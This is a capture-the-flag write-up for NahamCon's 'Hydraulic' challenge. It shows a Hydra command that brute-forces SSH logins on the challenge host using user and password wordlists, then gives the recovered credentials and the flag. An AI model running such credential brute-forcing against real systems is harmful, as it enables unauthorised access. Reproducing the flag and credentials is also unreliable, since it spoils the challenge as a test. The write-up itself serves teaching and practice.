# Hydraulic

## The brief
```
This is Stage 2 of Path 5 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.

Gain access with the information you have gathered thus far and retrieve the flag.

You may bruteforce this challenge... hence the name ;)

Press the Start button on the top-right to begin this challenge.
```
The hint and the previously gathered info should make this really easy.

## Logging in

We are supposed to ssh in: `ssh -p 30946 challenge.nahamcon.com`. But as who and how? Well we have some lists from `Lyra`. And what rhymes with `Hydraulic`? `Hydra`! Wait... that's not how rhyming works...

## Hydra

Hydra is a credential bruteforcing tool that we will use as follows:
```
hydra -L users -P wordlist ssh://challenge.nahamcon.com:30946 

-L users => L denotes a list of users; l would be a single username

-P wordlist => P denotes a list of passwords; p would be a single password

ssh:// => the service 

challenge.nahamcon.com => the host

:30946 => the port
```
So what wordlists shall we use? Think back to `Lyra`! We have these:
```
passwords:

starstar
allstars
starstruck
starshine
starsky
popstars
starship
bluestars
pinkstars
superstars
ilovestars
rockstars
thestars
starscream
gostars
shootingstars
northstars
alpinestars
starsign
moonandstars
starsrock
luckystars
iluvstars
fivestars
redstars
mystars
lovestars
dallasstars
moonstars
sunmoonstars
starsailor
silverstars
sevenstars
lilstars
dotaallstars
sunstars
starsun
starsstars
starsareblind
pokerstars
magicstars
divastars
blackstars
starstarstar
starsearch
luvstars
greenstars
deathstars
brightstars
twinstars
starsinthesky
starshooter
starsha
threestars
summerstars
starspirit
starshollow
starsandstripes
starsandmoons
nightstars
metrostars
icstars
hoodstars
deadstars
citystars
```
```
users: 

orion
pavo
gus
vela
hercules
leo
lyra
gemini
```
Now some of you may have just tried with `lyra`, but that is not the user we will login as.

## Getting the flag:

After just a little bit of time this appears:
```
[32432][ssh] host: challenge.nahamcon.com   login: pavo  password: starsinthesky
```
So ssh over:
```
ssh -p 32432 pavo@challenge.nahamcon.com

pavo@challenge.nahamcon.com's password: starsinthesky
```
And then?
```bash
pavo@hydraulic-6cd1af33c856d4b5-6f5bb8b867-q9fgh:~$ ls
flag.txt
pavo@hydraulic-6cd1af33c856d4b5-6f5bb8b867-q9fgh:~$ cat flag.txt
flag{cadbbfd75d2547700221f8c2588e026e}
```
There it is! 